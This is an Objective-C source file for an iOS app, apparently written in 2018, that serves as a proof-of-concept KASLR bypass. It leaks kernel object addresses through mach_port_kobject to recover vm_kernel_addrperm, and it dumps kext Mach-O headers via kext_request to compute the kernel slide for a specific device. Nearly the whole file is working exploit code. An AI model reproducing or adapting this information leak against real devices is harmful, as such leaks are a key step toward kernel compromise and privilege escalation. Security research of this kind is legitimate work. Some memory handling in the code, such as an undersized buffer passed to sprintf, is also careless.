//
//  ViewController.m
//  kaslr
//
//  Created by Davide Ornaghi on 8/20/18.
//  Copyright (c) 2018 Davide Ornaghi. All rights reserved.
//

#import "ViewController.h"
#import <mach/port.h>
#import <mach/mach.h>
#import <mach/kern_return.h>
#import <mach/mach_types.h>
#import <mach/vm_types.h>

#include "IOKitKeys.h"
#include "IOKitLib.h"
#include "decode.h"  // base64_decode library

#define IKOT_MASTER_DEVICE      19
#define	IKOT_HOST				3
#define	IKOT_HOST_PRIV			4
#define IKOT_HOST_SECURITY		17
#define REALHOST_IPT4           0x803219a8
// You can find the realhost static address for your device by looking at the return value of _host_priv_self

#define __LAST_HC               0x80342000  // __last section offset for n81AP 

@interface ViewController ()


@end

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
	// Do any additional setup after loading the view, typically from a nib.
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

struct portinfo {
    mach_port_name_array_t	ports;
    mach_port_type_array_t	types;
    mach_msg_type_number_t  portnum;
};

struct foundports {  // return type for findCoolPorts()
    mach_vm_address_t addresses[10];
    natural_t types[10];
};

// XNU code https://opensource.apple.com/source/configd/configd-24.1/SystemConfiguration.fproj/SCDPrivate.c for debugging purposes
mach_port_name_t _SC_logMachPortStatus(void)
{
	kern_return_t		status;
	mach_port_name_array_t	ports;
	mach_port_type_array_t	types;
	mach_msg_type_number_t	pi, pn, tn;
	CFMutableStringRef	str;
        
	/* report on ALL mach ports associated with this task */
	status = mach_port_names(mach_task_self(), &ports, &pn, &types, &tn);
	if (status == MACH_MSG_SUCCESS) {
		str = CFStringCreateMutable(NULL, 0);
		for (pi = 0; pi < pn; pi++) {
			char rights[16], *rp = &rights[0];
            
			if (types[pi] != MACH_PORT_TYPE_NONE) {
				*rp++ = ' ';
				*rp++ = '(';
				if (types[pi] & MACH_PORT_TYPE_SEND)
					*rp++ = 'S';
				if (types[pi] & MACH_PORT_TYPE_RECEIVE)
					*rp++ = 'R';
				if (types[pi] & MACH_PORT_TYPE_SEND_ONCE)
					*rp++ = 'O';
				if (types[pi] & MACH_PORT_TYPE_PORT_SET)
					*rp++ = 'P';
				if (types[pi] & MACH_PORT_TYPE_DEAD_NAME)
					*rp++ = 'D';
				*rp++ = ')';
			}
			*rp = '\0';
			CFStringAppendFormat(str, NULL, CFSTR(" %d%s"), ports[pi], rights);
		}
		NSLog(@"Task ports (n=%d):%@", pn, str);
		CFRelease(str);
	}
    
	return ports[pn-1];
}

struct portinfo getMachPorts()
{
    kern_return_t		    status;
    mach_port_name_array_t	ports;
    mach_port_type_array_t	types;
    mach_msg_type_number_t  typenum, portnum;
    // get current task port names and types
    status = mach_port_names(mach_task_self(), &ports, &portnum, &types, &typenum);
    if (status == MACH_MSG_SUCCESS) {
        fprintf(stdout, "Found %d task ports:\n", portnum);
        return (struct portinfo) {ports, types, portnum};
    } else {
        fprintf(stderr, "Err: mach_port_names(): %s", mach_error_string(status));
        return (struct portinfo) {NULL, NULL, 0};
    }
}

// Only return ports that are useful for exploitation
struct foundports findCoolPorts() {
    struct portinfo dump = getMachPorts();
    mach_port_name_t *ports = dump.ports;
    mach_msg_type_number_t portnum = dump.portnum;
    natural_t type;
    mach_vm_address_t addr;
    int count = 0;
    struct foundports coolports = {};
    for (int i = 0; i < portnum; i++){
        if (mach_port_kobject(mach_task_self(), ports[i], &type, &addr) == MACH_MSG_SUCCESS) {
            if (addr != 0 ) {
                if (type == IKOT_MASTER_DEVICE) {
                    fprintf(stdout, "Got MASTER port kobject at: 0x%8llx\n", addr);
                    if (count < 10) {
                        coolports.addresses[count] = addr;
                        coolports.types[count++] = type;
                    }
                } else if (type == IKOT_HOST || type == IKOT_HOST_PRIV || type == IKOT_HOST_SECURITY) { // IKOT_HOST_*
                    fprintf(stdout, "Got IKOT_HOST type port kobject at: 0x%8llx\n", addr);
                    if (count < 10) {
                        coolports.addresses[count] = addr;
                        coolports.types[count++] = type;
                    }
                }
                fprintf(stdout, "kobject addr: 0x%8llx   type: %u\n", addr, type);
            }
        }
    }
    return coolports;
}

// Find Mach-o headers
NSString *getMacho(NSString *dump){
    const char *PATTERN1 = "<key>OSBundleMachOHeaders</key><data ID=\"2\">";
    const char *PATTERN2 = "</data><key>OSBundleCPUType</key>";
    char *target = NULL;
    char *start, *end;
    if ((start = strstr((char *)[dump UTF8String], PATTERN1))) {
        start += strlen(PATTERN1);
        if ((end = strstr(start, PATTERN2))) {
            target = (char *)malloc(end - start + 1);
            memcpy(target, start, end - start);
            target[end - start] = '\0';
        }
    }
    
    if (target) {
        NSString *ret = [[NSString alloc] initWithUTF8String:target];
        return ret;
    }
    
    return NULL;
}

- (NSURL *)applicationDocumentsDirectory {
    return [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject];
}

NSData *getKextInfoData()
{
    vm_offset_t req = (vm_offset_t)"<dict><key>Kext Request Predicate</key><string>Get Loaded Kext Info</string></dict>";
    mach_msg_type_number_t len = (mach_msg_type_number_t)(strlen((const char *)req) + 1);
    vm_offset_t response = (vm_offset_t)NULL;
    mach_msg_type_number_t responseLen = 0;
    vm_offset_t log = (vm_offset_t)NULL;
    mach_msg_type_number_t logLen = 0;
    kern_return_t res;
    
    kext_request(mach_host_self(), 0, req, len, &response, &responseLen, &log, &logLen, &res);
    if (res != KERN_SUCCESS) {
        fprintf(stderr, "Error requesting Kext Info\n");
        return NULL;
    }
    NSData *plist = [[NSData alloc] initWithBytes:(const void *)response length:responseLen];
    return plist;
}

- (IBAction)read:(id)sender {
    fprintf(stdout, "Retrieving current task ports:\n");
    findCoolPorts();
    long long secret, err;
    struct foundports coolports; 
    /*mach_port_t master;
     if (IOMasterPort(MACH_PORT_NULL, &master) != KERN_SUCCESS) {
     fprintf(stderr, "Error: %u", IOMasterPort(MACH_PORT_NULL, &master));
     exit(-1);
     }*/
    io_master_t ipc_master_port = 0;
    err = host_get_io_master(mach_host_self(), &ipc_master_port);  // might not end up in kernel_task -> reboot and try again
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "Error: %s", mach_error_string(err));
        exit(-1);
    }
    
    fprintf(stdout, "Allocated master port\n");
    
    coolports = findCoolPorts();
    
    // Try to leak vm_kern_addrperm
    for (int i = 0; i < 10; i++) {
        if (coolports.addresses[i] != (mach_vm_address_t)NULL) {
            if (coolports.types[i] == IKOT_MASTER_DEVICE) {
                secret = coolports.addresses[i] - 1;   // quick maths
                fprintf(stdout, "Kobject: 0x%8llx - vm_kernel_addrperm = 0x%llx\n", coolports.addresses[i], secret);
                continue;
            } else {   // found IKOT_HOST
                secret = coolports.addresses[i] - REALHOST_IPT4;
                // you will either get the same secret as IKOT_MASTER or 0xffffffffsecret
                fprintf(stdout, "Kobject: 0x%8llx - vm_kernel_addrperm = 0x%llx\n", coolports.addresses[i], secret);
                continue;
            }
        }
    }
}

- (IBAction)go:(id)sender {
    NSString *strData = [[NSString alloc]initWithData:getKextInfoData() encoding:NSUTF8StringEncoding];
   // NSLog(@"%@", strData);
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];  // App documents dir
    NSString *path = [documentsDirectory stringByAppendingPathComponent:@"headers.txt"];  // Full path
    
    BOOL isWriteable = [[NSFileManager defaultManager] isWritableFileAtPath: documentsDirectory];
    if (isWriteable) {
        [strData writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
        NSLog(@"Wrote headers.txt to /Documents");
    }
    else
        NSLog(@"Directory is not writable");
    NSString *macho = getMacho(strData);
    //NSLog(@"%@", macho);
    char *charData = (char *)[macho UTF8String];
    size_t inputLen = strlen(charData);
    size_t outputLen = 0;
    unsigned char *binData = malloc(outputLen);
    binData = base64_decode(charData, inputLen, &outputLen);  // base64 to binary conversion
    unsigned char temp[4];
    for (int i=0; i<4; i++) {
        temp[i] = binData[0x628+(3-i)];   // Little to big endian
    }
    char *addr = malloc(4);
    sprintf(addr, "%02X%02X%02X%02X", temp[0], temp[1], temp[2], temp[3]);
    unsigned int iaddr, slide=0;
    sscanf(addr, "%x", &iaddr);
    slide = iaddr - __LAST_HC;
    fprintf(stdout, "Kernel slide: 0x%X\n", slide);
    free(binData);
    free(addr);
}

@end
